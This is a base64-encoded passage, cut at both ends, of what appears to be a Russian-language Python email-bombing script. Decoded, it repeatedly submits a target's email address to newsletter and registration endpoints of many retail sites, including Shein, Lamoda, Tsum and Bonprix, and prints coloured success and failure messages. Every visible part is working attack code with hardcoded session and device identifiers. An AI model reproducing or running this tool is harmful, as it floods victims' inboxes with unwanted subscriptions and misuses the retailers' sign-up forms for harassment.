0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgY3ljbGUgKz0gMQogICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsnICsgRm9yZS5DWUFOICsgc3RyKGN5Y2xlKSArIEZvcmUuQkxVRSArICcg0YbQuNC60Lsg0L/RgNC+0LnQtNC10L1dJykKCiAgICBlbHNlOgogICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgW9Ca0L7Qu9C40YfQtdGB0YLQstC+INGG0LjQutC70L7Qsl06ICcgKyBGb3JlLkNZQU4gKyBzdHIoY291bnQpKQogICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgW9CU0LvRjyDQvtGB0YLQsNC90L7QstC60Lgg0L3QsNC20LzQuCAnICsgRm9yZS5DWUFOICsgJ0N0cmwgKyBaJyArIEZvcmUuQkxVRSArICddJykKICAgICAgICBmb3IgY3ljbGUgaW4gcmFuZ2UoY291bnQpOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9ydS5zaGVpbi5jb20vdXNlci9hdXRoL3N1YnNjcmliZT9fbGFuZz1ydSZfdmVyPTEuMS44JywgZGF0YT17J2VtYWlsJzogZW1haWx9KQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KCdodHRwczovL3d3dy5zaW5zYXkuY29tL3J1L3J1L2FqeC9jdXN0b21lci9yZWdpc3Rlci8/bHBwX25ld19sb2dpbicsIGRhdGE9eydlbWFpbCc6IGVtYWlsLCdmaXJzdG5hbWUnOiAnRG1pdHJ5JywnbGFzdG5hbWUnOiAnSXZhbm92JywncGFzc3dvcmQnOiAnV0VzZDIzU0RTZHRyJywnaXNfc3Vic2NyaWJlZCc6IDEsJ3N1YnNjcmlwdGlvblBsYWNlJzogJ2N1c3RvbWVyX3JlZ2lzdGVyJ30pCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmhvdXNlYnJhbmQuY29tL3J1L3J1L2FqeC9uZXdzbGV0dGVyL3N1YnNjcmliZS8nLCBkYXRhPXsnZW1haWwnOiBlbWFpbCwnc3Vic2NyaXB0aW9uUGxhY2UnOiAnZm9vdGVyJywndGVybXMnOiAxfSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cubGFtb2RhLnJ1L3N1YnNjcmliZS9uZXdzbGV0dGVyLycsIGRhdGE9eyd1cmwnOiAnL3NhbGVzL29yZGVyL2hpc3RvcnkvJywnZW1haWwnOiBlbWFpbCwnbG9jYXRpb24nOiAncG9wX3VwX25ld19iYXInLCdpc19mcm9tX3BhcnRuZXInOiAnZmFsc2UnLCdnZW5kZXInOiAnTScsJ3N1YnNjcmlwdGlvbl90eXBlJzogJ0RFRkFVTFQnfSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBlbnRlciA9IGVtYWlsLnJlcGxhY2UoJ0AnLCAnJTQwJykKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vc3RvY2ttYW5uLnJ1L2FqYXgvP2NvbnRyb2xsZXI9c3Vic2NyaXB0aW9uJmFjdGlvbj1hZGQmZW1haWw9e30mZm9ybT1mb3JtJnJvbGVzJTVCJTVEPW1lbiZyb2xlcyU1QiU1RD13b21lbicuZm9ybWF0KGVudGVyKSkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuY3JvcHAuY29tL3J1L3J1L2FqeC9uZXdzbGV0dGVyL3N1YnNjcmliZS8nLCBkYXRhPXsnZW1haWwnOiBlbWFpbCwnc3Vic2NyaXB0aW9uUGxhY2UnOiAnc2l0ZV9uZXdzbGV0dGVyJ30pCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vaW50ZWdyYXRpb25hcGkubmV0L3VuaXFsby9hcGkvQ29udGFjdHM/Zm9ybWF0PWpzb24nLCBqc29uPXsiUGhvbmVOdW1iZXIiOiI3OTA5NTEyMzEyMyIsIkdlbmRlciI6MiwiRGF0ZU9mQmlydGgiOiIxOTkyLTExLTExIDAwOjAwOjAwLjAwMCIsIkZpcnN0TmFtZSI6IkRtaXRyeSIsIkNvbnRhY3RHcm91cElkIjo5MTk2NzQsIkVtYWlsIjplbWFpbH0pCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd2ViLnBvcG1lY2hhbmljLnJ1L3dlYi9jb250YWN0cy81NDAyLz92aWQ9MTAxMzUyNjgyMTcnLCBqc29uPXsiZW1haWwiOmVtYWlsLCJmb3JtIjoyNDcyMCwic2V0dGluZ3MiOjI0MzUxLCJjb25kaXRpb25zIjoxNTQ3MTIsImRldmljZSI6InBjIiwic291cmNlIjoib3JnYW5pYyIsInVybCI6Imh0dHBzOi8vemFyaW5hLnJ1LyIsImN1c3RvbXMiOnsiZmllbGRzX2xpc3QuYWdyZWVtZW50IjoxLCJtaW5kYm94RGV2aWNlVVVJRCI6IjQ4OTkzNDc4LTNhMWYtNGNlZS1hZTcyLTBkMTlkZDZiYjk1OCJ9LCJ1dG1fc291cmNlIjoieWFuZGV4In0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLnRzdW0ucnUvc3Vic2NyaWJlJywgaGVhZGVycz17J1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTBfMTVfNykgQXBwbGVXZWJLaXQvNjA1LjEuMTUgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzE1LjIgU2FmYXJpLzYwNS4xLjE1J30sIGpzb249eyJnZW5kZXIiOiJGIiwiZW1haWwiOmVtYWlsLCJwcml2YWN5UG9saWN5IjondHJ1ZScsImlkIjoic3ViX25ld3MiLCJzb3VyY2UiOiJzdWJzX2Zvb3RlciIsIkNPTVBPTkVOVF9OQU1FIjoidHN1bTpwb3B1cC5sZWF2ZSJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gZW1haWwucmVwbGFjZSgnQCcsICclNDAnKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vdHZvZS5ydS9hamF4L3N1YnNjcmliZV91c2VyLnBocCcsIGRhdGE9eydkYXRhJzogJ3Nlc3NpZD03Y2MwZTI0YjBhMTJmYTYwYzIyMjk0OWQ0NmY3ODM5YSZ0eXBlPXN1YnNjcmliZSZub3RlPVkmbGljZW5zZXNfc3Vic2NyaWJlPVkmRU1BSUw9e30mbGljZW5zZXNfcG9wdXA9WSZ3ZWJfZm9ybV9zdWJtaXQ9JUQwJTlGJUQwJUJFJUQwJUI0JUQwJUJGJUQwJUI4JUQxJTgxJUQwJUIwJUQxJTgyJUQxJThDJUQxJTgxJUQxJThGJy5mb3JtYXQoZW50ZXIpfSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93ZWIucG9wbWVjaGFuaWMucnUvd2ViL2NvbnRhY3RzLzYwMjEvP3ZpZD0xMDEyODY4MzczNicsIGpzb249eyJlbWFpbCI6ZW1haWwsImZvcm0iOjE0NzM1LCJzZXR0aW5ncyI6MTQ1OTQsImNvbmRpdGlvbnMiOjE0NjgzNywiZGV2aWNlIjoicGMiLCJzb3VyY2UiOiJvcmdhbmljIiwidXJsIjoiaHR0cHM6Ly93d3cuc2VsYS5ydS8iLCJjdXN0b21zIjp7ImFncmVlbWVudCI6MSwibWluZGJveERldmljZVVVSUQiOiJiNzJjZTcwMy0xYTkzLTQ1NmMtOGI0Yy04OTAxZWU2YjNlYmIifSwidXRtX3NvdXJjZSI6InlhbmRleCJ9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gZW1haWwucmVwbGFjZSgnQCcsICclNDAnKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vYXBpLm1pbmRib3gucnUvdjMvanMvb3BlcmF0aW9ucy9hc3luYz92ZXJzaW9uPTEuMC4yNzQmdHJhbnNwb3J0PWJlYWNvbiZvcGVyYXRpb249b3B0aW4mb3JpZ2luRG9tYWluPXd3dy5zZWxhLnJ1JywgJ29yaWdpbkRvbWFpbj13d3cuc2VsYS5ydSZkZXZpY2VVVUlEPWI3MmNlNzAzLTFhOTMtNDU2Yy04YjRjLTg5MDFlZTZiM2ViYiZvcGVyYXRpb249b3B0aW4maWFuYVRpbWVab25lPUV1cm9wZSUyRk1vc2NvdyZkYXRhPSU3QiUyMmN1c3RvbWVyJTIyJTNBJTdCJTIyZW1haWwlMjIlM0ElMjJ7fSUyMiUyQyUyMnN1YnNjcmlwdGlvbnMlMjIlM0ElNUIlN0IlMjJicmFuZCUyMiUzQSUyMlNlbGElMjIlMkMlMjJwb2ludE9mQ29udGFjdCUyMiUzQSUyMkVtYWlsJTIyJTdEJTVEJTdEJTJDJTIycG9pbnRPZkNvbnRhY3QlMjIlM0ElMjJoZWxsb21haWxmb290ZXIlMjIlN0QnLmZvcm1hdChlbnRlciksIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd2ViLnBvcG1lY2hhbmljLnJ1L3dlYi9jb250YWN0cy80MjE2Lz92aWQ9MTAxNDM2NDA3NzMnLCBqc29uPXsiZW1haWwiOmVtYWlsLCJmb3JtIjoyNzU4OSwic2V0dGluZ3MiOjI3MjEzLCJjb25kaXRpb25zIjoxNTY4NjYsImRldmljZSI6InBjIiwic291cmNlIjoidXRtIiwidXJsIjoiaHR0cHM6Ly93d3cuZ3VsbGl2ZXIucnUvY2F0YWxvZy9vZGV6aGRhP2JyYW5kcz1ndWxsaXZlcixndWxsaXZlci1iYWJ5JnV0bV9zb3VyY2U9eWFuZGV4JnV0bV9tZWRpdW09Y3BjJnV0bV90ZXJtPWJuZ2x2cl8tLS1hdXRvdGFyZ2V0aW5nJnV0bV9jb250ZW50PXRleHRsaW5rX2F3MjJfMiZ1dG1fY2FtcGFpZ249Y2F0ZWdvcmllc19hdXRvdGFyZ2V0aW5nX21za19wb2lzayZ5Y2xpZD0xODA5NDEyNjE0NTQyNjQ3NzI0OCIsImN1c3RvbXMiOnsiYWdyZWVtZW50IjoxLCJtaW5kYm94RGV2aWNlVVVJRCI6IjIxODdmMzA0LWZlMjItNGQxZi1iNDU4LTBiNzhkZGUzYWMxNiJ9LCJ1dG1fc291cmNlIjoieWFuZGV4IiwidXRtX21lZGl1bSI6ImNwYyIsInV0bV9jYW1wYWlnbiI6ImNhdGVnb3JpZXNfYXV0b3RhcmdldGluZ19tc2tfcG9pc2siLCJ1dG1fY29udGVudCI6InRleHRsaW5rX2F3MjJfMiIsInV0bV90ZXJtIjoiYm5nbHZyXy0tLWF1dG90YXJnZXRpbmcifSwgdGltZW91dD0xMCkKICAgICAgICAgICAgICAgIGlmIDIwMCA8PSByLnN0YXR1c19jb2RlIDwgMzAwOiAKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLkJMVUUgKyAnIFsrXScgKyBGb3JlLkNZQU4gKyAnINCj0YHQv9C10YjQvdCw0Y8g0L7RgtC/0YDQsNCy0LrQsCcpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgdGltZS5zbGVlcCgzKQogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly93d3cuY29zc3RvcmVzLmNvbS9sb2NhbC9jb21wb25lbnRzL21vcml6by9tYWluLnN1YnNjcmliZS9hamF4LnBocCcsIGRhdGE9eydlbWFpbCc6IGVtYWlsLCdnZW5kZXJDb2RlJzogMCwnYWN0aW9uJzogJ3N1YnNjcmliZScsJ2JyYW5kX2lkJzogMX0sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmJvbnByaXgucnUvbmV3c2xldHRlci9wZXJtaXNzaW9uLycsIGRhdGE9eydsYXllcic6ICdob21lJywnZW1haWwnOiBlbWFpbCwnc291cmNlUGFnZUNsaWNrJzogJ25sTGF5ZXJTZW5kJ30sIHRpbWVvdXQ9MTApCiAgICAgICAgICAgICAgICBpZiAyMDAgPD0gci5zdGF0dXNfY29kZSA8IDMwMDogCiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5CTFVFICsgJyBbK10nICsgRm9yZS5DWUFOICsgJyDQo9GB0L/QtdGI0L3QsNGPINC+0YLQv9GA0LDQstC60LAnKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBwcmludChGb3JlLlJFRCArICcgWy1dJyArIEZvcmUuQ1lBTiAgKyAnINCd0LUg0YPQtNCw0LvQvtGB0Ywg0L7RgtC/0YDQsNCy0LjRgtGMJykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QoJ2h0dHBzOi8vd3d3LmFya2V0LmNvbS9sb2NhbC9jb21wb25lbnRzL21vcml6by9tYWluLnN1YnNjcmliZS9hamF4LnBocCcsIGRhdGE9eydlbWFpbCc6IGVtYWlsLCdnZW5kZXJDb2RlJzogJzEgdGFiaW5kZXg9JywnYWN0aW9uJzogJ3N1YnNjcmliZSd9LCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgICAgaWYgMjAwIDw9IHIuc3RhdHVzX2NvZGUgPCAzMDA6IAogICAgICAgICAgICAgICAgICAgIHByaW50KEZvcmUuQkxVRSArICcgWytdJyArIEZvcmUuQ1lBTiArICcg0KPRgdC/0LXRiNC90LDRjyDQvtGC0L/RgNCw0LLQutCwJykKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoRm9yZS5SRUQgKyAnIFstXScgKyBGb3JlLkNZQU4gICsgJyDQndC1INGD0LTQsNC70L7RgdGMINC+0YLQv9GA0LDQstC40YLRjCcpCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgJyBbLV0nICsgRm9yZS5DWUFOICArICcg0J3QtSDRg9C00LDQu9C+0YHRjCDQvtGC0L/RgNCw0LLQuNGC0YwnKQogICAgICAgICAgICB0aW1lLnNsZWVwKDMpCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGVudGVyID0gZW1haWwucmVwbGFjZSgnQCcsICclNDAnKQogICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9tYy51czQubGlzdC1tYW5hZ2UuY29tL3N1YnNjcmliZS9mb3JtLXBvc3QtanNvbj91PWE3NWQ0YjRhMWZjNDQ4Nzk3OTY2YzNiOTImaWQ9MDUxZmFlZjU2ZiZwb3B1cD10cnVlJkVNQUlMPXt9JmJfYTc1ZDRiNGExZmM0NDg3OTc5NjZjM2I5Ml8wNTFmYWVmNTZmPSZjPWRvam9fcmVxdWVzdF9zY3JpcHRfY2FsbGJhY2tzLmRvam9fcmVxdWVzdF9zY3JpcHQxJy5mb3JtYXQoZW50ZXIpLCB0aW1lb3V0PTEwKQogICAgICAgICAgICAgI